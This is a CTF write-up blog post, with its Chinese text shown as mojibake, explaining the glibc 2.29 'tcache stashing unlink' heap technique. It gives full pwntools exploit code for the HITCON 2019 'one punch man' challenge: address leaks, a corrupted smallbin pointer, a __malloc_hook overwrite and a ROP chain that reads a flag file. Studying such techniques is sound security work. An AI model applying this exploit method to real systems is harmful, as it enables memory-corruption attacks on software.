---
clayout: post
title:  "glibc2.29-tcache stashing unlink"
date:   2020-2-17
desc: ""
keywords: ""
categories: [Binary]
tags: [pwn]
icon: icon-html
---

# glibc2.29-tcache stashing unlink

> ðŸ‘´çš„é’æ˜¥å›žæ¥ðŸŒ¶

å…ˆå­¦æ´‹æ–‡

```
stashing	è‹±[ËˆstÃ¦ÊƒÉªÅ‹]    ç¾Ž[ËˆstÃ¦ÊƒÉªÅ‹]
v.	å­˜æ”¾; è´®è—; éšè—;
[è¯å…¸] stashçš„çŽ°åœ¨åˆ†è¯;
[ä¾‹å¥] Instead of stashing an umbrella in your bag, consider grabbing one of his hats on a rainy day.
åœ¨ä¸‹é›¨å¤©ï¼Œä½ ä¸ç”¨åœ¨åŒ…é‡Œè£…æŠŠé›¨ä¼žï¼Œè€Œæ˜¯å¯ä»¥è€ƒè™‘æˆ´é¡¶ä»–çš„å¸½å­ã€‚
[å…¶ä»–] åŽŸåž‹ï¼šstash
```



### åŽŸç†

```c
  /*
     If a small request, check regular bin.  Since these "smallbins"
     hold one size each, no searching within bins is necessary.
     (For a large request, we need to wait until unsorted chunks are
     processed to find best fit. But for small ones, fits are exact
     anyway, so we can check now, which is faster.)
   */

  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

ç”³è¯·äº†ä¸€ä¸ªsmall chunkåŽï¼Œä¼šåŽ»å’Œç”³è¯·å¤§å°ä¸€æ ·smallbinæ‰¾free chunkï¼Œå¦‚æžœæœ‰å°±æŠŠå®ƒæ”¾åˆ°tcache binä¸Š

* æ¡ä»¶
  1. small binä¸Šè‡³å°‘æœ‰ä¸¤ä¸ªfree chunk
  2. tcache binå¿…é¡»æœ‰ç©ºé—´

æ­¤æ—¶å‘ç”Ÿä¸¤ç§unlink

1. æŠŠç”³è¯·çš„small chunkä»Žsmall binä¸­unlinkå‡ºåŽ»ï¼Œæœ‰å®Œæ•´æ€§æ£€æŸ¥

   ```c
   	  if (__glibc_unlikely (bck->fd != victim))
   	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
   ```

   

2. æŠŠsmall binä¸­å‰©ä½™çš„free chunk unlinkåˆ°tcache binä¸­ï¼Œæ²¡æœ‰æ£€æŸ¥

   ```c
   #if USE_TCACHE
   	  /* While we're here, if we see other chunks of the same size,
   	     stash them in the tcache.  */
   	  size_t tc_idx = csize2tidx (nb);
   	  if (tcache && tc_idx < mp_.tcache_bins)
   	    {
   	      mchunkptr tc_victim;
   
   	      /* While bin not empty and tcache not full, copy chunks over.  */
   	      while (tcache->counts[tc_idx] < mp_.tcache_count
   		     && (tc_victim = last (bin)) != bin)
   		{
   		  if (tc_victim != 0)
   		    {
   		      bck = tc_victim->bk;
   		      set_inuse_bit_at_offset (tc_victim, nb);
   		      if (av != &main_arena)
   			set_non_main_arena (tc_victim);
   		      bin->bk = bck;
   		      bck->fd = bin;
   
   		      tcache_put (tc_victim, tc_idx);
   	            }
   		}
   	    }
   #endif
   ```

   `bck->fd = bin;`å¯ä»¥åˆ©ç”¨

   binæ˜¯ä¸€ä¸ªlibcåœ°å€ï¼Œå¦‚æžœèƒ½æŽ§åˆ¶bckï¼Œå°±èƒ½ä»»æ„åœ°å€å†™å…¥ä¸€ä¸ªlibcåœ°å€ï¼Œæ•ˆæžœå’Œunsorted bin attackå·®ä¸å¤šï¼ŒðŸ‘´çš„é’æ˜¥åˆå›žæ¥ðŸŒ¶

   è¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸€ä¸ªå¾ªçŽ¯ï¼Œå¯¹äºŽä¼ªé€ çš„bckï¼Œbck->bkæœ‰å¯èƒ½æ˜¯éžæ³•åœ°å€ï¼Œä¸‹ä¸€ä¸ªå¾ªçŽ¯æ—¶ä¼šcrash

   å¦‚æžœtcache binåªå‰©ä¸€ä¸ªç©ºé—´ï¼Œå¾ªçŽ¯ä¸€æ¬¡ç»“æŸï¼Œå¯ä»¥é¿å…è¿™ç§æƒ…å†µ

   small binå¯ä»¥é€šè¿‡last remainderå¾—åˆ°

   1. å¡žæ»¡tchache bin
   2. å†freeä¸€ä¸ªè¿›unsorted bin
   3. ä»Žunsorted binä¸­åˆ‡ä¸€éƒ¨åˆ†å‡ºæ¥ï¼Œå‰©ä¸‹last remainderçš„sizeåœ¨smallèŒƒå›´ 
   4. ç”³è¯·æ¯”last remainderå¤§çš„chunkï¼Œlast remainderé€è¿›small bin

   
   
   è¿™ç§æ–¹æ³•åœ¨glibc-2.27ä¹Ÿå¥½ä½¿

### åŸºæœ¬æ“ä½œ

1. æžå‡ºæ¥å·®ä¸€ä¸ªå°±æ»¡çš„tcache binï¼Œå‡†å¤‡å¾€é‡Œé¢å¡ž

2. æžå‡ºæ¥unsorted binå‡†å¤‡åˆ‡

3. æžå‡ºæ¥ä¸¤ä¸ªsizeåœ¨small chunkèŒƒå›´å†…çš„last remainder

4. ç”³è¯·sizeæ¯”last remainderçš„sizeå¤§çš„chunkï¼Œlast remainderè¿›small bin

5. æ”¹åŽè¿›å…¥çš„small chunkçš„bkä¸ºfuck_addrï¼Œfdä¸å˜

6. ç”³è¯·å’Œè¿™ä¸¤ä¸ªsmall chunkçš„sizeç›¸åŒçš„chunkï¼Œä¸¤ä¸ªsmall chunkï¼Œå…ˆè¿›å…¥çš„åˆ†é…å‡ºåŽ»ï¼ŒåŽè¿›å…¥çš„è¿›tcache binï¼Œfuck_addr+0x10å†™å…¥ä¸€ä¸ªlibcåœ°å€

   

### Hitcon 2019 one punch man

ä½¿ç”¨callocï¼Œä¸ä»Žtcache biné‡Œå–å‡ºï¼Œå¾ˆæ–¹ä¾¿

ç›®æ ‡æ˜¯æ‰“tcache_perthread_struct()

```python
for i in range(6):
	add(0,'a'*0xf0)
	free(0)

for i in range(7):
	add(0,'a'*0x400)
	free(0)

add(0,'b'*0x400)
add(2,'a'*0x400)
free(0)
add(2,'a'*0x300)

add(1,'c'*0x400)
add(2,'a'*0x400)
free(1)
add(2,'a'*0x300)

add(2,'a'*0x400)

edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+0x3a60)+p64(heap_base+0x1b))

add(1,'x'*0xf0)
r.interactive()
```

editå‰

```
tcachebins
0x100 [  6]: 0x55555555a9f0 â€”â–¸ 0x55555555a8f0 â€”â–¸ 0x55555555a7f0 â€”â–¸ 0x55555555a6f0 â€”â–¸ 0x55555555a5f0 â€”â–¸ 0x55555555a4f0 â—‚â€” 0x0

smallbins
0x100: 0x55555555d280 â€”â–¸ 0x55555555ca60 â€”â–¸ 0x7ffff7fb1d90 (main_arena+336) â—‚â€” 0x55555555d280
```

```
pwndbg> x/10gx 0x55555555d280
0x55555555d280:	0x0000000000000000	0x0000000000000101
0x55555555d290:	0x000055555555ca60	0x00007ffff7fb1d90
0x55555555d2a0:	0x6363636363636363	0x6363636363636363
0x55555555d2b0:	0x6363636363636363	0x6363636363636363
0x55555555d2c0:	0x6363636363636363	0x6363636363636363
pwndbg> x/10gx 0x55555555ca60
0x55555555ca60:	0x0000000000000000	0x0000000000000101
0x55555555ca70:	0x00007ffff7fb1d90	0x000055555555d280
0x55555555ca80:	0x6262626262626262	0x6262626262626262
0x55555555ca90:	0x6262626262626262	0x6262626262626262
0x55555555caa0:	0x6262626262626262	0x6262626262626262
```

editåŽ

```
tcachebins
0x100 [  6]: 0x55555555a9f0 â€”â–¸ 0x55555555a8f0 â€”â–¸ 0x55555555a7f0 â€”â–¸ 0x55555555a6f0 â€”â–¸ 0x55555555a5f0 â€”â–¸ 0x55555555a4f0 â—‚â€” 0x0

smallbins
0x100 [corrupted]
FD: 0x55555555d280 â€”â–¸ 0x55555555ca60 â€”â–¸ 0x7ffff7fb1d90 (main_arena+336) â—‚â€” 0x55555555d280
BK: 0x55555555ca60 â€”â–¸ 0x55555555d280 â€”â–¸ 0x55555555901b â—‚â€” 0x0
```

```
pwndbg> x/10gx 0x55555555d280
0x55555555d280:	0x0000000000000000	0x0000000000000101
0x55555555d290:	0x000055555555ca60	0x000055555555901b
0x55555555d2a0:	0x6363636363636363	0x6363636363636363
0x55555555d2b0:	0x6363636363636363	0x6363636363636363
0x55555555d2c0:	0x6363636363636363	0x6363636363636363
pwndbg> x/10gx 0x55555555ca60
0x55555555ca60:	0x0000000000000000	0x0000000000000101
0x55555555ca70:	0x00007ffff7fb1d90	0x000055555555d280
0x55555555ca80:	0x6262626262626262	0x6262626262626262
0x55555555ca90:	0x6262626262626262	0x6262626262626262
0x55555555caa0:	0x6262626262626262	0x6262626262626262

```

add(1,'x'*0xf0)åŽ

```
tcachebins
0x100 [  7]: 0x55555555d290 â€”â–¸ 0x55555555a9f0 â€”â–¸ 0x55555555a8f0 â€”â–¸ 0x55555555a7f0 â€”â–¸ 0x55555555a6f0 â€”â–¸ 0x55555555a5f0 â€”â–¸ 0x55555555a4f0 â—‚â€” 0x0

smallbins
0x100 [corrupted]
FD: 0x55555555d280 â€”â–¸ 0x55555555a9f0 â—‚â€” 0x6161616161616161 ('aaaaaaaa')
BK: 0x55555555901b â—‚â€” 0x0
```

```
pwndbg> x/10gx 0x55555555901b
0x55555555901b:	0x0000000007000000	0x0000000000000000
0x55555555902b:	0x00007ffff7fb1d90	0x0000000000000000
```

ç„¶åŽå¯ä»¥è¿›åŽé—¨ï¼Œè¿›ä¹‹å‰uafè®©åŽé—¨çš„mallocç”³è¯·çš„malloc_hookï¼ŒæŠŠadd_rsp_0x48_rå†™åˆ°malloc_hook

åœ¨ä¸‹ä¸€æ¬¡addä¸­rop

```python
from pwn import *
#r = remote('node3.buuoj.cn',25105)
r = process('./hitcon_ctf_2019_one_punch')
elf = ELF('./hitcon_ctf_2019_one_punch')
libc = ELF('./libc-2.29.so')


def add(index,name):
	r.recvuntil('> ')
	r.sendline('1')
	r.recvuntil('idx: ')
	r.sendline(str(index))
	r.recvuntil('hero name: ')
	r.send(name)


def edit(index,name):
	r.recvuntil('> ')
	r.sendline('2')
	r.recvuntil('idx: ')
	r.sendline(str(index))
	r.recvuntil('hero name: ')
	r.send(name)

def show(index):
	r.recvuntil('> ')
	r.sendline('3')
	r.recvuntil('idx: ')
	r.sendline(str(index))

def free(index):
	r.recvuntil('> ')
	r.sendline('4')
	r.recvuntil('idx: ')
	r.sendline(str(index))

def fuck(payload):
	r.recvuntil('> ')
	r.sendline('50056')
	r.sendline(payload)

for i in range(7):
	add(0,'a'*0x200)
	free(0)
show(0)
r.recvuntil('hero name: ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
heap_base = leak - 0xcb0
log.success(hex(heap_base))
add(0,'a'*0x200)
add(1,'./flag\x00\x00'+'a'*0x200)
free(0)
show(0)
r.recvuntil('hero name: ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak - 0x1e4ca0
log.success(hex(libc_base))
add(0,'a'*0x200)

for i in range(6):
	add(0,'a'*0xf0)
	free(0)

for i in range(7):
	add(0,'a'*0x400)
	free(0)


add(0,'b'*0x400)
add(2,'a'*0x400)
free(0)
add(2,'a'*0x300)

add(1,'c'*0x400)
add(2,'a'*0x400)
free(1)
add(2,'a'*0x300)

add(2,'a'*0x400)

edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+0x3a60)+p64(heap_base+0x1b))

add(0,'a'*0x217)
malloc_hook = libc_base+libc.sym['__malloc_hook']
free(0)
edit(0,p64(malloc_hook))

add(1,'x'*0xf0)

log.success(hex(malloc_hook))

add_rsp_0x48_r = libc_base + 0x8cfd6
fuck(p64(add_rsp_0x48_r))
fuck(p64(add_rsp_0x48_r))

p_rdi = libc_base + 0x26542
p_rsi = libc_base + 0x26f9e
p_rdx = libc_base + 0x12bda6
p_rax = libc_base + 0x47cf8
syscall = libc_base + 0xcf6c5

#open
payload = p64(p_rdi)+p64(heap_base+0x12e0)
payload += p64(p_rsi)+p64(0)
payload += p64(p_rdx)+p64(0)
payload += p64(p_rax)+p64(2)
payload += p64(syscall)

#read
payload += p64(p_rdi)+p64(3)
payload += p64(p_rsi)+p64(heap_base+0x12e0)
payload += p64(p_rdx)+p64(0x70)
payload += p64(p_rax)+p64(0)
payload += p64(syscall)

#write
payload += p64(p_rdi)+p64(1)
payload += p64(p_rsi)+p64(heap_base+0x12e0)
payload += p64(p_rdx)+p64(0x70)
payload += p64(p_rax)+p64(1)
payload += p64(syscall)
log.info(hex(len(payload)))
add(0,payload)
r.interactive()

```

